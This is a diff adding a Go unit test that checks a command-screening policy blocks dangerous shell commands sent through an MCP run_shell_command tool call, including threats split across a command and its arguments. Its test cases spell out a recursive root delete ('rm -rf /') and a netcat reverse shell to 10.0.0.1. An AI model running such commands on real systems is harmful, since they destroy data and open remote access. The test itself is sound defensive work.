@@ -8,7 +8,9 @@
 package governance
 
 import (
+	"encoding/json"
 	"path/filepath"
+	"strings"
 	"testing"
 
 	"github.com/stretchr/testify/assert"
@@ -52,6 +54,47 @@ func TestL1Doctrine_ValidatePayload_McpCallRequested(t *testing.T) {
 				assert.NotEmpty(t, violations, "Expected violations for tool_name: %s", tt.toolName)
 			} else {
 				assert.Empty(t, violations, "Expected NO violations for tool_name: %s", tt.toolName)
+			}
+		})
+	}
+}
+
+// A run_shell_command MCP call executes command plus args as one command line,
+// so doctrine must screen that line exactly as it screens EXECUTE_BASH: a
+// threat split across the command and its arguments is not a side door.
+func TestL1Doctrine_ValidatePayload_RunShellCommandScreensTheExecutedCommandLine(t *testing.T) {
+	doctrine := NewL1Doctrine()
+	tests := []struct {
+		name      string
+		arguments string
+		blocked   bool
+	}{
+		{name: "recursive root delete split into args", arguments: `{"command":"rm","args":["-rf","/"]}`, blocked: true},
+		{name: "reverse shell split into args", arguments: `{"command":"nc","args":["-e","/bin/sh","10.0.0.1","4444"]}`, blocked: true},
+		{name: "recursive root delete in command", arguments: `{"command":"rm -rf /"}`, blocked: true},
+		{name: "benign listing split into args", arguments: `{"command":"ls","args":["-la","/srv/app"]}`},
+	}
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			var request struct {
+				Command string   `json:"command"`
+				Args    []string `json:"args"`
+			}
+			if !assert.NoError(t, json.Unmarshal([]byte(tt.arguments), &request)) {
+				return
+			}
+			commandLine := strings.Join(append([]string{request.Command}, request.Args...), " ")
+			assert.Equal(t, tt.blocked, len(doctrine.ValidatePayload(&operatorv1.CommandRequested{Command: commandLine})) > 0,
+				"EXECUTE_BASH control for %q", commandLine)
+
+			violations := doctrine.ValidatePayload(&operatorv1.McpCallRequested{
+				ToolName:      constants.MCPToolRunShellCommand,
+				ArgumentsJson: tt.arguments,
+			})
+			if tt.blocked {
+				assert.NotEmpty(t, violations)
+			} else {
+				assert.Empty(t, violations)
 			}
 		})
 	}
